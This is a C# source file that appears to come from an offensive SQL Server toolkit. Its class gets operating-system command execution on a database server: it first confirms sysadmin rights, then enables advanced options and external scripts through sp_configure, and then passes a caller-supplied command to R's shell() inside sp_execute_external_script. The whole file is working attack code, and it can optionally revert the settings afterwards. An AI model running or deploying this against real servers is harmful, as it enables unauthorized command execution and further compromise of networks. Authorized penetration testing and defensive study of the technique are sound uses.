using System;
using System.Data;
using System.Linq;
using System.Text;

/*
sp_configure 'show advanced options',1
reconfigure
go

sp_configure 'external scripts enabled',1
reconfigure WITH OVERRIDE
go
*/

namespace DAFT.Modules
{
    sealed class SQLOSCmdR
    {
        private string QUERY1_1 = @"
EXEC sp_execute_external_script
  @language=N'R',";

        private string QUERY1_3 = @"
  WITH RESULT SETS(([Output] varchar(max)));";

        private readonly Credentials credentials;
        private bool restoreState = false;
        private string instance = string.Empty;
        private string computerName = string.Empty;

        internal SQLOSCmdR(Credentials credentials)
        {
            this.credentials = credentials;
        }

        internal void SetInstance(string instance)
        {
            this.instance = instance;
        }

        internal void SetComputerName(string computerName)
        {
            this.computerName = computerName;
        }

        internal void RestoreState()
        {
            restoreState = true;
        }

        internal void Query(string query)
        {
            if (!SQLSysadminCheck.Query(instance, computerName, credentials))
            {
                Console.WriteLine("[-] User is not SysAdmin");
                return;
            }
            using (SQLConnection sql = new SQLConnection(instance))
            {
                sql.BuildConnectionString(credentials);
                if (!sql.Connect())
                    return;

                int sao_value = (int)_Query(sql, @"sp_configure 'Show Advanced Options'", "config_value");
                if (0 == sao_value)
                    _Query(sql, @"sp_configure 'Show Advanced Options',1;RECONFIGURE", string.Empty);

                int xcs_value = (int)_Query(sql, @"sp_configure 'external scripts enabled'", "config_value");
                if (0 == xcs_value)
                    _Query(sql, @"sp_configure 'external scripts enabled',1;RECONFIGURE", string.Empty);

                StringBuilder sb = new StringBuilder();
                sb.Append(QUERY1_1);
                sb.Append(string.Format("@script=N\'OutputDataSet <- data.frame(shell(\"{0}\",intern=T))\'", query));
                sb.Append(QUERY1_3);
#if DEBUG
                Console.WriteLine(sb.ToString());
#endif
                Console.WriteLine(App.DELIMITER);
                Console.WriteLine((string)_Query(sql, sb.ToString(), "output"));
                Console.WriteLine(App.DELIMITER);

                if (0 == xcs_value && restoreState)
                    _Query(sql, @"sp_configure 'external scripts enabled',0;RECONFIGURE", string.Empty);
                if (0 == sao_value && restoreState)
                    _Query(sql, @"sp_configure 'Show Advanced Options',0;RECONFIGURE", string.Empty);
            }
        }

        private static object _Query(SQLConnection sql, string query, string value)
        {
            DataTable table = sql.Query(query);
            try
            {
                foreach (DataRow row in table.AsEnumerable())
                    if (!string.IsNullOrEmpty(value))
                        return row[value];
            }
            catch (Exception ex)
            {
                if (ex is ArgumentNullException)
                    Console.WriteLine("Empty Response");
                else
                    Console.WriteLine(ex.Message);
            }
            return string.Empty;
        }
    }
}
